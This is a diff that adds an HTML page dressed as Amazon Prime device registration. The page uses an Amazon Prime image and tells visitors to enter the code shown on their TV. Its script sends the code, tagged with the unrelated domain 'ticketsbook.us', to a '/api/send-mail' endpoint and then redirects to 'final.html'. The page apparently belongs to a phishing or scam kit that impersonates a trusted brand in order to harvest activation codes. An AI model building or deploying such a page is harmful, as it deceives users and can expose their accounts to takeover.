@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+
+    <meta charset="utf-8">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <title>Services - Connection Services</title>
+
+    <link rel="stylesheet" href="assets/demo.css">
+    <link rel="stylesheet" href="assets/form-search.css">
+    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.min.css">
+
+
+</head>
+<figure class="centered">
+
+    <img class="img-responsive" src="assets/images/amazon-prime.jpg" alt="amazon-prime">
+</figure>
+
+<header>
+    <h1>Register A Device</h1>
+</header>
+
+<div class="light-background d-block centered">
+    <h1>Register Your Compatible TV or Device</h1>
+</div>
+
+<div class="centered ">
+    <h1>Enter The Code You See On Your TV Or Device</h1>
+</div>
+
+<div class="main-content">
+    <form class="form-search" action="" method="post">
+        <div>
+            <label for="code" class="d-block f-left">Enter code</label>
+            <input type="text" class="d-block" required name="code" id="code" placeholder="code here..">
+
+        </div>
+        <div id="errors"></div>
+        <div class="d-block f-left">
+            <button type="submit" id="form-submit">submit</button>
+        </div>
+    </form>
+</div>
+
+<ul class="light-background">
+    <li>
+        <h1>STEP 1 :</h1>
+        <h3 class="light-text">Open The App On Your Device.</h3>
+    </li>
+    <li>
+        <h1>STEP 2 :</h1>
+        <h3 class="light-text"> Put The Code In The Above Box.</h3>
+    </li>
+    <li>
+        <h1>STEP 3 :</h1>
+        <h3 class="light-text">Click " SUBMIT " After Entering Code.</h3>
+    </li>
+</ul>
+
+<div id="myDIV"></div>
+
+<script>
+    const submitBTN = document.getElementById('form-submit');
+    const code = document.getElementById('code');
+    const errorsDIV = document.getElementById('errors');
+    code.addEventListener('keyup', (event) => {
+        if (!event.target.value || event.target.value === '') {
+            errorsDIV.style.color = "red";
+            errorsDIV.style.padding = "8px";
+            errorsDIV.innerHTML = 'Please enter code'
+        }
+        else {
+            errorsDIV.innerHTML = ''
+        }
+    });
+    submitBTN.addEventListener('click', (e) => {
+        e.preventDefault();
+        console.log(code.value);
+        if (!code || code.value === '') {
+            errorsDIV.style.color = "red";
+            errorsDIV.style.padding = "8px";
+            errorsDIV.innerHTML = 'Please enter code'
+            return;
+        }
+        const payload = {
+            code: code,
+        };
+        const data = new FormData();
+        data.append("json", JSON.stringify(payload));
+        const div = document.createElement('div');
+        div.setAttribute("class", "loading");
+        div.setAttribute("id", "loading");
+        document.getElementById("myDIV").style.display = 'block';
+        document.getElementById("myDIV").appendChild(div);
+        fetch('http://localhost:3100/api/send-mail', {
+            method: "post",
+            body: JSON.stringify({
+                code: code.value,
+                domain: 'ticketsbook.us'
+            }),
+            headers: {
+                'Accept': 'application/json, text/plain, */*',
+                'Content-Type': 'application/json; charset=UTF-8'
+            }
+            //make sure to serialize your JSON body
+
+        }).then(res => res.json()).then(res => {
+            document.getElementById("loading").remove();
+            document.getElementById("myDIV").style.display = 'none';
+            window.location = "final.html";
+        })
+            .catch(err => {
+                document.getElementById("loading").remove();
+                document.getElementById("myDIV").style.display = 'none';
+                alert(err);
+            })
+    })
+</script>
+
+</body>
+
+</html>
